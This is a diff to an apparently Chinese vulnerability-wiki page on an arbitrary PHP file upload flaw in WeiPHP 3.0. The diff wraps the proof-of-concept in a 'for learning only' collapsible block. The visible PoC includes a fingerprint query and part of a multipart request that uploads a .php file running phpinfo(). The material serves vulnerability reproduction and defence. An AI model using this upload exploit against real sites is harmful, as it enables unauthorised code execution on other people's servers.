@@ -25,8 +25,10 @@ WeiPHP3.0
 
 ```
 app="weiphp"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 登陆页面标识
@@ -47,11 +49,12 @@ Accept-Encoding: gzip
 Content-Disposition: form-data; name="download"; filename="882176.php"
 Content-Type: application/octet-stream
 
-<?php
+&lt;?php
 phpinfo();
 
---------------------------e37a54d7d5380c9f--
-```
+--------------------------e37a54d7d5380c9f--</code></pre>
+
+</details>
 
 ![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162318518.png)
 
